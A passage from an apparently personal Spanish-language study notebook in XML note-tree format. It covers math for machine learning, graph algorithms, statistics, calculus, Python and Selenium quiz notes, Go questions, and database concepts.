      ⇒ naturales es la union de todos los demas conjuntos, hay naturales positivos y naturales negativos
- Funciones y mas funciones (algebraicas y trascendentales)
   → el notebook esta en visualizacion_matplot
   → funcion lineal, tiene la forma f(x) = mx + b, solo depende de uno que es completamente lineal en este caso X
      ⇒ el dominio y rango van de -inf a inf
      ⇒ las funciones que grafican las computadoras son discretas
      ⇒ b = bias, donde corta x
   → polinomicas, es un polinomio de X, de x a la n hasta x a la cero
      ⇒ el grado es el numero mas grande que tiene nuestra funcion
      ⇒ generalmente los pares hacen curvas de concavas, los impares no
   → funciones trascendentes, no se pueden hacer por medio de sumas de polinomios, el caso de funciones trigonometricas, exponenciales, logaritmicas
   → funciones seccionadas, nciones que se comportan diferente dependiendo de los trozos, por ejemplo la funcion de Heaviside
   → funciones compuestas, es la combinacion de varias funciones, es lo llamado (f o g ), pasa por una funcion primero y luego pasa por la otra, en f o g, siempre pasa primero la evaluacion de g luego la de f
   → Funciones reales:
      ⇒ sus dominio y rango estan contenidos en el conjunto de los reales
- el perceptron
   → es la forma de como se define una neurona artificial
   → diferentes seniales de entrada, varios pesos, union sumadora, una funcion activadora y una salida
   → pesos sinapticos, numeros encargados de ponderar lo que entra
   → la funcion sumadora nos permite sumar el valor de entrada por su peso ponderado
   → carlos alarcon redes neuronales
- funciones de activacion
   → sirven para dar funciones de salida diferentes al perceptron
   → funcion lineal, lo que pasa lo regresa igual, sirve para mantener valores a travez de un proceso
   → funcion Heaviside, sirve para hacer clasificaciones categoricas, un booleano
   → sigmoide, sirve para un proceso de regresion logistica, sirve mucho pra probabilidades, los negativos siempre se acercaran al cero, al tocar el cero en x, se va la mitad mientras mas grande sea el valor tenderan al 1
   → tangente hiperbolica, funcion de escalamiento, va de -1 a 1, tiene que ver muhco con back propagation, si se acerca a 0 va a valer cero, si son muy grandes tienden a ser 1 y si son negativos a -1
   → ReLU, si el valor es 0 o menor que cero lo pone como cero, si es mayor que cero lo pondra como x, si exite lo tomo en cuenta si no no lo tomo en cuenta, existe una variacion llamada liquid ReLu
- regresion lineal simple, 
   → punto de corte es bias
   → inclinacion es la pendiente
- calculo del error:
   → el error es que tan lejos estoy de valor original al de prediccion
   → e = y_pred - y_real
   → |e| = |y_pred - y_real|
   → e**2 = (y_pred - y_real)**2
   → E = SUM_i=i-N (y_pred - y_real)**2
   → ECM = 1 / N (SUM_i=i-N (y_pred - y_real)**2)
</rich_text>
    </node>
    <node name="discretas" unique_id="116" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664581715" ts_lastsave="1665438600">
      <rich_text>- la logica es todo aquello con lo que tomamos decisiones
- aquello que tiene sentido para nosotros
- es coherente, estructurado y tiene sentido
- proposicion es dar un valor de verdadero o falso

Valor de verdad
- si se tiene p y q y alguna tiene un valor de verdadero, se pueden mezclar para obtener un valor resultado
- se usa 2^n para saber cuantos valores se tienen
- de aqui se puede tener la tabla de verdad
- si todo es verdadero se tiene una tautologia

Teoria de graficas (grafos)
- modelos mateamaticos que sirven para representar relaciones entre objetos de un conjunto
- es un conjunto de vertices conectados atraves de aristas e = (v, w)
- se pueden aplicar casi a todo
- nos ayudan a identificar rutas optimas
- tipos de grafos
   → simple, solo hay un camino que une los grafos
   → multigrafo, existen varios caminos unidos de los puntos
   → pseudografo, se tienen caminos hacia el mismo nodo
   → ponderado, tienen un numero de unidad asociada al nodo, nos dice que distancia se tiene o peso
   → dirigido, dice hacia donde se puede ir, puede ser que solo tenga un camino
   → multigrafo dirigido, se tienen distintas rutas y direcciones
- grado:
   → numero de aristas que inciden
   → todos los grados se pueden calcular: Sum dev(v) = 2 |E|, dos veces el numero de aristas que se tienen en grafo
   → para que se puede visitar un grafo donde se tengan mas de dos grados de tipo impar no se puede hacer sin pasar por un vertice 2 veces
   → caminos, cadenas y ciclos:
      ⇒ una cadena es una sucecion de aristas y suceciones donde se puede recorrer el grafico
      ⇒ camino, sucecion donde no se puede repetir ningun vertice ni ninguna arista
      ⇒ ciclo, es un camino, siempre se repite el vertice final
      ⇒ cadena cerrada, se inicia en un nodo y termina en ese nodo, pero se pueden repiten los vertices
      ⇒ grafo conexo, donde se tienen todos los vertices conectados entre si, si no se tiene la conexion entre los dos grafos es no conexo
- Eulerianos (pasar por todos los caminos y aristas)
   → en un camino euleriano se pueden repetir los vertices pero no se puede pasar por el mismo camino, se inicia en un punto termina en otro punto
   → este dependera del grado de los vertices, no mas de dos vertices con grado impar, si existen, debe iniciar y terminar en los vertices de grado impar
   → para un ciclo, todos los vertices deben de ser un grado par
- hamiltoneanos
   → recorrer todos los nodos solo una vez, sin importar cuantas veces pasemos por los caminos, puede que no pasen por todos los caminos, camino
   → grado(u) - grado(v) &gt;= n - 1, u es inicio, v es final, n es numero de vertices, no es una condicion necesaria y suficiente
   → puede ser camino pero no es ciclo, por ejemplo cuando lso vertices tienen grado 1
- matriz de adyaciencia
   → se usa para poner en una matriz los nodos cuantas conexiones tienen entre si, en dado caso de tener una conexion consigo mismo es representable a 1
   → si se suman las filas se tiene el grado de cada vertice
- matriz de incidencia
   → este se tiene los nodos y las aristas nombradas
   → se analiza columna por columna, por eso es llamado incidencia
   → es una matriz exclusivamente de 0 y 1
- para saber si un grafo es dirigido o no dirigido la matriz debe de ser no simetrica, las filas son iguales que las columnas

Arboles
- se usa bastante en machine learning
- se organiza una atras de la otra
- son los tipos de graficos ams usados en programacion
- nos permiten organizar datos (objetos)
- si se tiene un nodo a y b solo se tiene una conexion entre ellos
- se usan para expresar relaciones de jerarquia
- tipos
   → libres, no e ve claro cual es el nodo raiz
   → raiz, donde se ve una estructura clara
   → expansion, se tiene una unidad o recurso asociados a las conexiones entre nodos
   → binarios, aquellos donde solo se tienen dos conexiones en cada nivel
- nivel y altura:
   → los niveles empiezan en 0 siendo este el nodo raiz
   → el nivel depende de cuantos nodos conectados existen de inicia hasta el total de nodos conectados, la altura es el numero de niveles
- sub arboles, vertices terminales e internos
   → es una parte de un arbol que existe en un arbol mas grande
   → un vertice terminal es donde termina el arbol, los internos es donde, los internos son aquellos que tienen hijos dentro del arbol
- Arbol de expansion minimo
   → es donde se tienen todos los nodos conectados entre si, y en ellos se tienen ciertos pesos entre conexione de nodo
   → un minimo es donde se busca un arbol donde la conexion entre todos debe de ser minimo de coste
   → en estos se busca que sean los de menor coste sin importar si ya tiene otra conexion, no se debe de crear un circuito entre las conexiones
- Arbol binario
   → solo se tienen dos hijos por cada uno de los vertices
   → tipos
      ⇒ binario completo, tiene sus dos ramas bien definidas o no tiene ninguna
      ⇒ binario lleno, es identico al completo, pero todos llegan hasta un mismo nivel
      ⇒ degenerado, la mayoria de sus hijos solo tienen un hijo
- recorrido de arboles
   → pre orden, raiz - izq - der
   → in orden, izq - raiz - der
   → pos orden, izq - der - raiz
- expresioenes aritmeticas
   → los vertices terminales son operandos (numeros)
   → los vertices internos son operadores
   → la raiz siempre debe de ser un operador
   → se puede obtener por medio de:
      ⇒ pre fijo que es pre orden
      ⇒ entre fijo que es in orden
      ⇒ pos fijo que es pos orden

ALGORITMOS
- algoritmo de Prim
   → encontrar el arbol de expansion minimo en una representacion grafica
   → inicio -&gt; selecciona un vertice -&gt; selecciona la arista de menor peso conectada al vertice seleccionado -&gt; en cada iteracion selecciona la arista de menor perso relacionado con los vertices conectados -&gt; el algoritmo finaliza cuando todos los vertices estan conectados con n-1 aristas -&gt; fin
   → debido a que es un arbol, se pueden tomar cualquiera de las aristas de los nodos conectados, por ejemplo si tenemos dos nodos y en uno de ellos se tiene una arista menor no importa si fue el primero que el otro, se puede tomar el de menor costo, CUIDADO: no se deben de formar circuitos
- algoritmo de DIJKSTRA
   → busca la ruta optima o coste optimo entre conectar un punto de inicio con uno final
   → Inicio -&gt; asignar para cada nodo no visitado infinito -&gt; mantener un registo de los nodos visitados -&gt; calcular distancias a cada nuevo nodo sumando la distancia anterior -&gt; si la distancia nueva calculada es menor que la anterior, reemplazarla, sino ignorarlo -&gt; el algoritmo finaliza cuando se llega al nodo final -&gt; fin
   → se hacen multiples iteraciones para ir probando varios caminos apra llegar el nodo que se busca
- algoritmo de Kruskal
   → se busca conectar el minimo coste, se basa en las conexiones que se tienen, se busca de principio la conexion con menor coste
   → Inicio -&gt; selecciona arista menor -&gt; en cada iteracion agregue la arista de menor longitud del conjunto de arcos disponibles -&gt; el algoritmo finaliza cuando todos los vertices estan conectado con n-1 arcos -&gt; inicio
   → se buscan conectar los nodos primero por las menores conexiones, sin importar si aun no estan conectados con el primer nodo
- algoritmo de FLEURY
   → este sirve para obtener un circuito euleriano
   → se crean subciclos para irlos uniendo, se unen donde el nodo es tocado por el anterior subciclo, como si se hiciera una substitucion
   → inicio -&gt; verificar grado de mi grafico -&gt; realizar un circuito cerrado -&gt; en cada iteracion contruye un nuevo camino cerrado visitando aristas incidentes que no han sido visitados -&gt; reemplaza cada nuevo circuito en el inicial hasta visitar todas las aristas -&gt; fin
- algoritmo de flujo maximo
   → se aplica sobre un grafo dirigido
   → es saber que tanto se puede enviar por un grafo dirigido
   → se busca donde se tenga mas flujo
   → se selecciona por caminos del punto de inicio hasta donde es el final
   → se busca por donde enviar toda la informacion, pasando por todo el grafo
   → Inicio -&gt; direccionar flujos e iniciar en ceros -&gt; obtener trayectoras buscando siempre el mayor flujo -&gt; escoger el menor flujo de la trayectoria -&gt; actualizar el grafico con las capacidades minimas -&gt; buscar nueva trayectoria en aumento y repetir hasta que no exista mas -&gt; fin</rich_text>
    </node>
    <node name="simbolos matematicos" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652638040" ts_lastsave="1665438595">
      <rich_text>simbolos
- son importantes por que estan a nuestro alrededor
- las mates se crearon o se inventaron:
   → se cree que ambas son reales en cierta medida
- nosotros entendemos el universo a travez de nuestra mente, somo parte del universo
- elementos basicos:
   → numeros
   → letras, realmente son alfabetos, el griego es importante
   → simbolos aritmeticos
   → elementos comunes, los tres puntos generalmente tiene una expresion muy distinto
- existen ciertas expresiones matematicas que se consideran bellas, por ejemplo la idedntidad de euler, se compone de elementos basicos dentro de las mates

Lenguaje matematico
- aritmetica //
   → es la base de todo en las matematicas
   → generalmente esto ya se da por sentado
   → existen otros metodos numericos, como el base 60, es muy favorable para las divisiones (2, 3, 4, 6, 10), nuestro tiempo se basa en este
- algebra
   → concepto abstracto de la variable
      ⇒ la variable puede tener varios valores
   → nace del persa: al-jabr wa-l
   → geometrizacion del algebra
   → griegos: latus - lado (incognita)
   → arabes: mal y jadhr - lado o base
   → europeos: jadhr - base o raiz de una planta
- se tiene 3 periodos:
   → retorica, se comunicaban de voz a voz, no existian los escritos
   → anotadas, se hacia escribiendo con palabras
   → simbolica, es donde stamos parados en este momento

Numero y varibles
- sistema binario
- sistema decimal
- sistema hexadecimalseparador decimal, coma o punto decimal, separar dentro de la parte entere de la fraccionaria
- numero naturales, son con los cuales contamos, existe una definicion con el 0, pero es raro
- enteros se tiene los negativos, 0 y naturales
- racionales, se pueden dividir en fracciones m/n donde n no puede ser 0
- irracionales, no se pueden expresa como una fraccion, como por ejemplo pi
- reales, incluyes todo lo anterior y todos los que no se pueden expresar como fraccion
- completos, numeros reales con el numero imaginario _i_
- alfabetos
   → el mas usado es el romano o latin
   → griego, se usa bastante para angulos y constantes
   → gotico, por ejemplo la d gotica para derivadas parciales
- por que x siempre es la incognita
   → Rene Descartes, fue quien empezo a usar las ultimas letras del alfabeto latino como incognitas y las primeras como parametros conocidos y se reforzo con los ejes cartecianos (x, y, z)

Notacion cientifica
- subindices:
   → enumeriones, x_1, x_2
   → diferenciadores, E_m = E_p + E_c
   → contadores de iteraciones, A = (a_i,j)_2x2
- se usan los puntos en diagonal cuando se expande hacia columnas y filas
- super indices
   → potencias, x^4
   → diferenciadores, por ejemplo segunda derivada de y
   → enumeraciones, se usa mas en textos: identidad de euler^1
- Notacion cientifica
   → se usa mucho para representar cantidades muy grande (positivo) y muy pequenio (negativos) mas facil
   → constante de avogrado, es un numero muy grande que se require expresar con 10 ^ 23
   → se usan prefijos de unidades en SI

Aritmeticos y de agrupacion
- se hace el uso de simbolos +: suma, -: resta, /: division y *: multipicacion, hay otras formas de hacer estos mismos, pero se complica en la computadora
- jerarquia (de izquierda a derecha cuando salen juntos)
   → signos de agrupacion
   → potencia y raiz
   → division y multiplicacion
   → suma y resta
- operadores de agrupacion, {}, [], (), en 1399, se usaba por primera vez, y fue el punto, para lectura, en 1470 se usaron parentesis
   → John Wallis, vinculum, paso a ser la raiz cuadrada
- simbolos combinados o alterados, como mas-menos y menos-mas

comparacion y desigualdad
- simbologia basica
   → menor que
   → mayor que
   → menor igual que
   → mayor igual que
- intervalos finitos
   → [a, b], a &lt;= x &lt;= b 
   → [a, b), a &lt;= x &lt; b
   → (a, b], a &lt; x &lt;= b
- intervalos infinitos
   → [-inf, a], -inf &lt; x &lt;= b 
   → [-inf, a), -inf &lt; x &lt; a
   → (-inf, inf], -inf &lt; x &lt; inf
- relacion
   → &lt;&lt; mucho menor que
   → &gt;&gt; mucho mayor que
   → ~ similar
   → ~= congruente
   → (tres puntos) ppor lo tanto
   → E -&gt; pertenece
- geometricos
   → paralelos ||
   → perpendicular, lineas perpendiculares
   → angulo, angulo de 45
   → angulo recto, angulo de 90
   → trinagulo
   → angulo XYZ, repsentado con un angulo de 45 con XYZ
   → triangulo ABC, un triangulo con letras ABC
   → existe los de:
      ⇒ segmentos de linea con AB
      ⇒ vector, linea con flecha
      ⇒ recta, flecha para los dos lados
      ⇒ arco, un “sombrero”

Operadores logicos
- </rich_text>
    </node>
    <node name="calculo" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617840076" ts_lastsave="1617842337">
      <rich_text>Funcion
- es una relación entre dos conjuntos a traves de la cual cada elemento le corresponde un unico elemento ninguno del otro conjunto
- hay variables dependientes e independientes

Dominio
- al conjunto de partida se le llama dominio - X

Contradominio
- al conjunto de llegada contradominio - y

Representación gráfica
- debe poseer pares ordenados X, y sobre R2

Que es una derivada?
</rich_text>
    </node>
    <node name="estadistica" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1657140372" ts_lastsave="1697594653">
      <rich_text>base de la estaditica
- que es una muestra?
   → subconjunto de algo mas grande (poblacion)
   → tiene que ser representativa
- variable aleatoria
   → es una caracteristica de la poblacion
   → siguen un determinado comportamiento llamado distribucion
   → dos tipos
      ⇒ discreta, enteros, contables, opciones finitas
      ⇒ continua, valores reales en un intervalo, dificilmente repetidos

Los tres analisis descriptivos fundamentales
- estadistica descriptiva, describe los datos que se tiene a mano
   → resumir analizar y sacar conclusiones
   → se divide en
      ⇒ tablas de frecuencia
         • se tienen las clases
         • frecuencia absoluta, total por clase
         • frecuencia absoluta acumulativa, sumar una tras la otra
         • frecuencia relativa, la frecuencia absoluta / total (porcentaje)
         • frecuencia relativa acumulada, frecuencia absoluta acumulativa / total
      ⇒ graficos
         • torta o pastel
         • histograma, se puede ver la distribucion de la variable
      ⇒ resumenes numericos
         • medidas de centralizacion
            ◇ media, promedio
            ◇ mediana, el numero que se tiene en medio
            ◇ moda, el que mas se repite
         • medidas de dispersion, cuan alejados estan los datos de la media
            ◇ varianza, s^2=(Sum_i=1~n(x_i-X)^2)/n, ~=hasta
            ◇ desviacion tipica, raiz cuadrada de la varianza

Datos agrupados con frecuencias
- formas distintas de repesentar y analizar la informacion
   → datos no agrupados, tal y cual vienen en su forma original
   → los agrupados se tienen los valores o intervalos de valores que tomo la variable y la frecuencia de ocurrencia
- Valores con frecuencia
   → es mas facil calcular la media, la mediana y la moda, se tiene que multiplicar el numero de la frecuencia por el valor
- valores por intervalos
   → se puede crear una columna con marca de clase, suele ser el punto intermedio (promedio)
   → columna de cada marca de clase por el total de frecuencias
   → la mediana es:
      ⇒ L_i + (((n/2) - N_(i-1))/ n_i) t_i
         • L_i extrem inferior del intervalo
         • n/2 la mitad del total
         • N_(i-1) frecuencia absoluta acumulada de la clase anterior
         • n_i frecuencia absoluta de la calse de la mediana
         • t_i tamanio del intervalo
   → Moda, el intervalo modal, donde se tiene mayor frecuencia absoluta
      ⇒ M = L_i + ((n_i - n_(i-1)) / ((n_i - n_(i-1)) + (n_i - n_(i+1))))

Cuantiles, Deciles y Percentiles
- las medidas de posicion son los cuantiles y se clasifican en 
   → cuartiles, dividos en 4 grupos
      ⇒ se ordenan los datos de mayor a menor, primero el minimo y el ultimo el maximo
      ⇒ se determina la posicion que ocupa cada cuartil
      ⇒ el segundo cuartil coincide con la mediana de los datos
      ⇒ estos se pueden calcular de diferentes formas
      ⇒ se basa en la mediana, ya que esta parte a los datos en dos, en cada grupo que queda se pueden tomar la mediana y asi obtener los demas cuartiles
      ⇒ si es un numero impar de variables se puede o no incluir la mediana, generalmente no se incluye
      ⇒ formula = Q_k = (K * (n + 1))  / 4
   → quintiles, en 5 partes
   → Deciles, en las 10 partes
   → percentiles, divididos en 100 partes
      ⇒ formula = p * n / 100, donde p = percentil, n = numero de valores
- los datos deben d estar ordenados

Diagramas de cajas y bigotes (box and wisjers plot)
- se usan los cuartiles
- la caja que se ve nos muestra el primer, segun y tercer cuartile, los bigotes son el minimo y el maximo, formado de primer y tercer cuartil
- la longitud de la caja se llama rango intercuartil  Ri = Q_3 - Q_1
- valores atipicos, cuando hay valores muhco muy grande o muy pequenios, (outliers), son un punto o cuadrado pequenio en el grafico
- para un valor atipico tiene que ser mayor a Q_3 + 1.5 * RI veces al rango intercuartil o menor a Q_1 - 1.5 * RI, se les puede llamar barreras

Asimetria:
- para cumplir simetria se tiene que la media, mediana y moda son iguales
- la negativa es cuando la media va a estar por debajo de la media y asi de la moda
- la positiva es cuando la media esta arriba de la medianada y esta de la moda
- se puede calcular:
   → Karl Pearson: A_s = (3(media - mediana)) / desviacion tipica, este varia entre -3 y 3, si es negativo es asimetrica negativa, 0 es simetrica, mayor que sera es simetria positivo
   → Yule Bowley o medida cuartilica: A_s = (Q_1 + Q_3 - 2*Q_2) / Q_3 - Q_1 varia entre -1 y 1 y la regla aplica igual que con pearson
   → Medida de Fisher (datos sin agrupar):  A_s = Sum_i^n(x_i - x_med)^3 / n*s^3 (n -&gt; total de datos, s -&gt; desviacion tipica)
      ⇒ con datos agrupados con frecuencias: A_s = Sum_i^n n_i*(x_i - x_med)^3 / n*s^3 (n -&gt; total de datos, s -&gt; desviacion tipica)
      ⇒ con datos agrupados por intervalos: A_s = Sum_i^n n_i*(x_mi - x_med)^3 / n*s^3 (n -&gt; total de datos, s -&gt; desviacion tipica, m_i marca de clase, n_i frecuencia por cada clase)</rich_text>
    </node>
    <node name="calculo diferencial" unique_id="117" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1665438687" ts_lastsave="1666050317">
      <rich_text>que es el calculo
- es una rama de las matematicas que es el calculo infinitesimal
   → es la variacion de las funciones cuando se tienen cambios muy pequenios
   → existen dos divisiones
      ⇒ calculo diferencial: estudia la tasa de cambio de las funciones cuando esos cambios son muy pequenios (se aproximan a cero)
      ⇒ calculo integral: estudia el proceso de integracion o de antiderivacion

Que es un limite?
- el limite es cuando la funcion f(x) si x tienda a ‘a’ es igual a ‘L’, se conoce si nos va a retornar un valor o no
- si el limite por izquierda y por la derecha son iguales cuando se tiene a ‘a’, entonces el limite ‘L’ existe

Definicion de la derivada
- nace entre fisicos la recta tangente
- nace de una secante, funcion que corta una curva en dos puntos
- la pendiente se calcula con y = mx + b
- pendiente de la recta tangente es la derivada

La derivada como razon de cambio
- nos ayuda a identificar la rapidez de cambio de algo'
- se usa mucho para cuestiones de optimizacion dentro del machine learning

La regla de la cadena
- es cuando se tiene la composicion de funcion
- la composicion de funciones es mas como un proceso de algo que va a pasar

Maximos y minimos
- si la pendiente es positiva va a crecer, la derivada mayor a 0,
- la derivada es menor que 0 entonces esta decreciendo
- si la derivada es igual a cero este puede ser un maximo y un minimo, puntos criticos
- si a la derecha es positivo y a la izquierda negativa es un minimo de forma inversa es un punto maximo</rich_text>
    </node>
    <node name="calculo diferencial" unique_id="121" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1667337877" ts_lastsave="1667339085">
      <rich_text>surge de Leibniz e Isaac Newton, son los que llegaron al desarrollo del calculo, lo que se usa en estos momentos es mucho de Leibniz

Funciones, dominio y rango
- es una regla que relaciona a un conjunto de entradas con un conjunto de posibles salidas
- el dominio son todos los valores que se les puede dat a la funcion y puede procesar
- el rango todos los posibles valores que resulten de la funcion

Tipos de funciones
- </rich_text>
    </node>
  </node>
  <node name="Nuevos lenguajes" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617842349" ts_lastsave="1698688730">
    <node name="Algoritmos y pensamiento logico" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617842365" ts_lastsave="1641884633">
      <rich_text>en python con () se hace un generator expresion que es como una lista pero mas potente, ocupa menos memoria

Un mÃ³dulo es un conjunto de paquetes
¿Qué módulo se utiliza para verificar los errores de tipado en un proyecto escrito en Python?
¿Cuál de las siguientes condiciones no es necesaria para encontrar un closure?
¿Qué es un decorador?
¿Cuántas veces puede iterarse un generador?
</rich_text>
    </node>
    <node name="python" unique_id="63" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1642641418" ts_lastsave="1646234786">
      <rich_text>Starlette permite:
¿Qué es OpenAPI?
La Ășltima parte de una URL, despuĂ©s del primer "/", recibe el nombre de:
¿Con cuál de las siguientes operations no deberías enviar jamás un request body?
</rich_text>
      <node name="selenium" unique_id="64" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1642694106" ts_lastsave="1643388034">
        <rich_text>- que es selenium
- cominucar con el navegador web
- automatizar pruebas unitarias y funcionales
- generar reportes de pruebas

- historia de selenium
   → suite de herramientas para automatizacion de navegadores
   → es compatible con varios lenguajes
   → no es una herramienta de testing ni de web scraping
   → es para curar el envenenamiento por mercurio (competencia de seleium en su momento)
   → pros
      ⇒ excelente para iniciar
      ⇒ no requiere saber programar
      ⇒ exporta scripts para slm RC y webdriver
      ⇒ genera reportes
      ⇒ soporte para varias platofrmas
      ⇒ operaciones logicas y condicionales
      ⇒ ddt
      ⇒ posee un api madura
   → contras
      ⇒ es mas complejo de instalar
      ⇒ necesita de un servidor corriendo
      ⇒ comandos redundantes en su api
      ⇒ navegacion no tan realista
   → selenium webdriver
      ⇒ soporta multiples lenguajes
      ⇒ facil de instalar
      ⇒ comunicacion directa con el navegador
      ⇒ interaccion mas realista
      ⇒ no soporta nuevos navegadores de forma rapida
      ⇒ no genera reportes o resultados
      ⇒ requiere saber programar
   → selenium grid
   → se utiliza junto a slenium rc
   → permite correr pruebas en paralelo
   → conveniente para ahorra tiempo

ERRORES
¿Qué lenguaje no es soportado oficialmente con Selenium?
java, c#, kotlin, perl, php, python, ruby, js
¿Qué assertion te permite validar el que el título del sitio web es el siguiente?
equals
¿Qué es y para qué nos sirven las test suites?
coleccion de pruebas unificadas en un solo archivo
¿Con qué me permite interactuar la clase WebDriver de Selenium?
ventana del navegador y sus elementos relacionados, como pop ups o alerts
¿Con qué me permite interactuar la clase WebElement de Selenium?
elementos de los sitios web
¿Qué acciones podemos utilizar para interactuar con un alert de JavaScript?
switch_to_alert, accept
Son todos mÃ©todos para automatizar la navegaciÃ³n:
back, forward, refresh
¿Qué hace el siguiente código?
implicita espera a que este el dom si lo encuentra continua
explicita utiliza condiciones de espera, continua hasta que la ecnuetnra
¿Por qué debemos utilizar la menor cantidad de esperas implícitas posibles?

¿Qué es una expected condition (condición esperada)?
¿Cuándo es conveniente utilizar try y except en nuestra prueba?
¿Por qué no debería automatizar o hacer testing en sitios que explícitamente lo prohíben?
bloqueo</rich_text>
      </node>
    </node>
    <node name="Go" unique_id="42" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1619532722" ts_lastsave="1683823150">
      <rich_text scale="h3" foreground="#eff3f8">¿Cómo declararías un map en Go que según el año guarde el nombre de los graduados del Curso?</rich_text>
      <rich_text>
</rich_text>
      <rich_text scale="h3" foreground="#eff3f8">¿Cuál es la forma correcta de editar código de librerías externas?</rich_text>
      <rich_text>
</rich_text>
      <rich_text scale="h3" foreground="#eff3f8">¿Qué sucede si buscamos un key que no existe en un map?</rich_text>
      <rich_text>
</rich_text>
      <rich_text scale="h3" foreground="#eff3f8">¿Cómo se implementa una interface en Go?</rich_text>
      <rich_text>
</rich_text>
      <rich_text scale="h3" foreground="#eff3f8">¿Qué método se utiliza para conectarse mediante TCP a un host y puerto?</rich_text>
      <rich_text>
</rich_text>
      <rich_text scale="h3" foreground="#eff3f8">¿Cuál es el método que se utiliza para leer en ElasticSearch?</rich_text>
      <rich_text>
</rich_text>
      <rich_text scale="h3" foreground="#eff3f8">¿Qué paquete y función se utiliza para codificar la response en json?</rich_text>
      <rich_text>
</rich_text>
      <rich_text scale="h3" foreground="#eff3f8">¿Para qué nos sirve el objeto T?</rich_text>
      <rich_text>
</rich_text>
      <rich_text scale="h3" foreground="#eff3f8">¿Qué se debe hacer para evitar un panic?</rich_text>
      <node name="bases de datos" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1623801007" ts_lastsave="1625170789">
        <rich_text>## Necesitamos crear un proyecto que haga de GO el backend y si es posible de front con angular... dockers o kubernetes

- crear entidades de la base de datos
- hacer atributos

# Historia
- lenguaje de consultas estructurado
- se crea para la consulta de datos... no exisitia de principio una forma estandar
- tiene una estructura clara y definida
- DDL, data definition language, ayuda a crear los simientos de la base de datos
- DML, sirve para el manejado de datos

# NoSQL
- existen varios tipos:
   → clave- valor
      ⇒ DynamoDB o Cassandra
   → en documentos
      ⇒ MongoDB o Firestore, generalmente son json
   → en grafos
      ⇒ neo4j o TITAN, relaciones complejas
   → en memoria
      ⇒ Memcache o redis
   → optimizadas para busquedas
      ⇒ BigQuery o Elasticsearch

# Firestore
- uso de cloud para las bases de datos
- Jerarquia:
   → base de datos que contiene toda la información
   → colección de documentos
   → documento
- top-level conections:
   → conecciones que se tienen de inmediato
- </rich_text>
        <rich_text style="italic">Tipos de datos en Firestore</rich_text>
        <rich_text>:
   1) </rich_text>
        <rich_text weight="heavy">String</rich_text>
        <rich_text>: Cualquier tipo de valor alfanumérico
   2) </rich_text>
        <rich_text weight="heavy">Number</rich_text>
        <rich_text>: Soporta enteros y flotantes.
   3) </rich_text>
        <rich_text weight="heavy">Boolenan</rich_text>
        <rich_text>: Los clásicos valores True y False
   4) </rich_text>
        <rich_text weight="heavy">Map</rich_text>
        <rich_text>: Permite agregar un documento dentro de otro.
   5) </rich_text>
        <rich_text weight="heavy">Array</rich_text>
        <rich_text>: Permite agregar un conjunto de datos (soporte multi type) sin nombre e identificador.
   6) </rich_text>
        <rich_text weight="heavy">Null</rich_text>
        <rich_text>: Indica que no se ha definido un valor.
   7) </rich_text>
        <rich_text weight="heavy">Timestamp</rich_text>
        <rich_text>: Permite almacenar fechas (guarda el año, mes, día y hora).
   8) </rich_text>
        <rich_text weight="heavy">Geopoint</rich_text>
        <rich_text>: Guarda una localización geográfica (coordenadas latitud-longitud).
   9) </rich_text>
        <rich_text weight="heavy">Reference</rich_text>
        <rich_text>: Permite referencia un documento (relaciona dos documentos, no importa su colección).

# Uso en la vida real
- no existen bases de datos unitalla
- big data
   → concepto de grandes cantidades de datos
   → es una serie de soluciones para almacenar una cantidad de datos grandes y en poco tiempo
   → se puede usar en business inteligent
   → es un movimiento de varios tipos de bases de datos
   → Cassandra -&gt; checar
- data warehouse
   → almacenaje de datos masivos
   → no guarda mucho por segundo
   → se guarda mas por manera historica
   → es el archivo muerto
   → big table, es una sola tabla, muy grande
   → nos permita hacer consultas sobre este mismo
   → resuelve preguntas acerca de que ha pasado
- data mining
   → es minar datos
   → </rich_text>
        <rich_text family="monospace">"Data mining, consiste en torturar los datos hasta que confiesen"</rich_text>
        <rich_text>
   → se dedica a extraer los datos donde quiera que esten, hace sentido de esta data
- ETL
   → la metodologia de extraer, transformar y cargar
   → es la tecnica que nos ayuda a saber cada cuando aplicar la extraccion
   → muchas veces las bases de datos no son suficientes para este tipo de cosas
   → transformar de la base o app a algo con valor
   → es mas una idea que algo especifico de una tecnologia en si
   → pasarlo por una serie de cambios y guardarlo cuando sean utiles
- Business intellingence
   → inteligencia para el negocio
   → se usa para tomar decisiones indicadas
   → se podria decir que es lo final de la cadenita
   → se pueden entender los usos que se le da a las cosas
- machine learning
   → son tecnicas para el tratamiento de datos
   → nos ayuda a crear modelos que no van por patrones fortuitos
   → encuentra correlacion que no se ven a simple vista
   → se agrupan en:
      ⇒ clasificacion
      ⇒ prediccion
- data science
   → es algo preciso
   → poca gente lo hace
   → son mas estadisticos
   → se debe desarrollar y saber para que sirve cada herramienta
</rich_text>
      </node>
